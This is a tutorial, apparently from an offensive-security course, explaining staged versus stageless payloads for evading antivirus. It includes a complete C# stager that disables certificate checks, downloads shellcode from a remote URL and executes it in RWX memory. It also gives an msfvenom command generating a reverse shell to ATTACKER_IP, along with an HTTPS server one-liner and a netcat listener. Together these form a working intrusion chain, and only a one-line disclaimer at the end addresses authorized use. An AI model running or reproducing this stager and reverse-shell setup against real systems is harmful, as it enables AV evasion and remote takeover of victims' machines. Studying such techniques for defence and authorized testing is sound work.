# Staged vs. Stageless Payloads

When attempting to bypass antivirus (AV) solutions, two main approaches exist for delivering shellcode to a victim: **staged** and **stageless** payloads. This guide explains the differences, advantages, and use cases for each method.

---

## Stageless Payloads

A **stageless payload** embeds the final shellcode directly within itself. Think of it as a packaged application that executes the shellcode in a single step.

**Example:**  
An executable embedding a simple shellcode (e.g., launching Calculator) is a stageless payload.

**How it works:**  
When the user runs the payload, the embedded shellcode executes immediately, such as providing a reverse shell to the attacker.

**Advantages:**
- All required code is packed into a single executable.
- No additional network connections are needed, reducing detection risk.
- Ideal for environments with restricted network connectivity.

---

## Staged Payloads

**Staged payloads** use intermediary shellcodes (stagers) to retrieve and execute the final shellcode.

**How it works:**
- The first stage (stage0) is a small stub that connects back to the attacker's machine to download the final shellcode.
- Once downloaded, stage0 injects the shellcode into memory and executes it.

**Advantages:**
- Small disk footprint (stage0 is minimal).
- If captured, defenders only get the stub, not the final shellcode.
- The final shellcode runs in memory and never touches disk, making detection harder.
- The same stage0 dropper can be reused for different shellcodes.

---

## Choosing Between Staged and Stageless

- **Stageless payloads** are better for environments with strict perimeter security or limited network access (e.g., USB drop attacks in closed networks).
- **Staged payloads** are ideal when minimizing on-disk footprint and avoiding detection by running the final payload in memory.

---

## Stagers in Metasploit

When using `msfvenom` or Metasploit, you can choose staged or stageless payloads. The naming convention helps distinguish them:

| Payload Name                        | Type            |
|------------------------------------- |-----------------|
| `windows/x64/shell_reverse_tcp`      | Stageless       |
| `windows/x64/shell/reverse_tcp`      | Staged          |

For Meterpreter:
- Stageless: `windows/x64/meterpreter_reverse_tcp`
- Staged: `windows/x64/meterpreter/reverse_tcp`

---

## Creating Your Own Stager

To create a staged payload, you can use a C# stager that downloads and executes shellcode from a remote server.

**Key Windows API Functions (via P/Invoke):**
- `VirtualAlloc()`: Reserves memory for shellcode.
- `CreateThread()`: Creates a new thread to run the shellcode.
- `WaitForSingleObject()`: Waits for the thread to finish.

**Example C# Imports:**
```csharp
[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

[DllImport("kernel32")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
```

**Stager Logic:**
1. Download shellcode from a URL using `WebClient`.
2. Allocate executable memory with `VirtualAlloc()`.
3. Copy shellcode into allocated memory.
4. Create a thread to execute the shellcode.
5. Wait for the thread to finish.

**Sample Code:**
```csharp
WebClient wc = new WebClient();
ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

byte[] shellcode = wc.DownloadData(url);

UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

IntPtr threadHandle = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr parameter = IntPtr.Zero;
threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

WaitForSingleObject(threadHandle, 0xFFFFFFFF);
```

**Compile the Stager:**
```powershell
PS C:\> csc staged-payload.cs
```

---

## Using the Stager to Run a Reverse Shell

1. **Generate Shellcode:**
    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
    ```

2. **Create a Self-Signed Certificate:**
    ```bash
    openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
    ```

3. **Start an HTTPS Server:**
    ```bash
    python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
    ```

4. **Set Up a Netcat Listener:**
    ```bash
    nc -lvp 7474
    ```

5. **Run the Stager on the Victim Machine:**  
    The stager will connect to the HTTPS server, download `shellcode.bin`, and execute it in memory.

---

**Note:**  
Always use these techniques in authorized environments and for educational or professional purposes only.

